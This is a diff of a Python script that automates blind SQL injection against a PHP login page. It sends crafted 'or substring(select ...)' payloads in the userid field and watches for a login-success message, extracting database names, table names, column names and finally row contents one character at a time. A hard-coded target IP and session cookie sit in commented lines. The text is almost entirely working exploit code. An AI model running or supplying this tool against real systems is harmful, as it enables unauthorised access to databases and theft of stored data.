@@ -10,7 +10,7 @@ from tkinter import Label, LabelFrame, Toplevel, ttk
 #url = 'http://104.197.42.200/member/login_ok.php'
 #cookies = {'PHPSESSID': 'd42rp6qqm5fhj3dmn3830g74pq'}
 keyword = '_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
-
+keyword2 = '1234567890_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
 check = '로그인 성공'.encode()
 
 def count_db(url, cookies):
@@ -19,7 +19,6 @@ def count_db(url, cookies):
 		value = "' or (select count(distinct table_schema) from information_schema.tables) = {}#".format(result)
 		params = {'userid': value, 'userpw': 'test'}
 		response = requests.post(url,data=params, cookies=cookies)
-		#print(response.content)
 		print(value)
 		if check in response.text.encode('utf-8'):
 			break
@@ -33,7 +32,6 @@ def count_data(url, cookies, table_name):
 		value = "' or 1=1 and (SELECT count(*) from {}) = {}#".format(table_name, result)
 		params = {'userid': value, 'userpw': 'test'}
 		response = requests.post(url,data=params, cookies=cookies)
-		#print(response.content)
 		print(value)
 		if check in response.text.encode('utf-8'):
 			break
@@ -52,7 +50,6 @@ def find_db_name(values, url, cookies):
                 value = "'or binary(substring((select distinct table_schema from information_schema.tables limit {},1),{},1)) = '{}'#".format(loop, i, key)
                 params = {'userid': value, 'userpw': 'test'}
                 response = requests.post(url,data=params, cookies=cookies)
-                #print(response.content)
                 print(value)
                 if check in response.text.encode('utf-8'):
                     result += key
@@ -76,7 +73,6 @@ def find_table_name(tableList, url, cookies, db_name):
             value = "' or 1=1 and substring((select table_name from information_schema.tables where table_type='base table' and table_schema='{}' limit {},1),{},1)='{}'#".format(db_name, size, i, key)
             params = {'userid': value, 'userpw': 'test'}
             response = requests.post(url,data=params, cookies=cookies)
-            #print(response.content)
             print(value)
             if check in response.text.encode('utf-8'):
                 result += key
@@ -104,7 +100,6 @@ def find_column_name(columnList, url, cookies, table_name):
             value = "' or 1=1 and substring((select column_name from information_schema.columns where table_name='{}' limit {},1),{},1)='{}'#".format(table_name, size, i, key)
             params = {'userid': value, 'userpw': 'test'}
             response = requests.post(url,data=params, cookies=cookies)
-	 		#print(response.content)
             print(value)
             if check in response.text.encode('utf-8'):
                 result += key
@@ -134,7 +129,7 @@ def dump_data(url, cookies, table_name, column_list):
             i = 1
             flag = True
             while flag:
-                for key in keyword:
+                for key in keyword2:
                     value = "' or 1=1 and substring(hex(concat((select {} from {} limit {},1))),{},1)='{}'#".format(column_name, table_name, size, i, key)
                     params = {'userid': value, 'userpw': 'test'}
                     response = requests.post(url,data=params, cookies=cookies)
@@ -144,11 +139,11 @@ def dump_data(url, cookies, table_name, column_list):
                         print(result)
                         i += 1
                         break
-                    if i == 1 and key == '0':
+                    if i == 1 and key == 'Z':
                         list.append('NULL')
                         flag = False
                         break
-                    if key == '0':
+                    if key == 'Z':
                         var = bytes.fromhex(result).decode('utf-8')
                         print(var)
                         list.append(var)
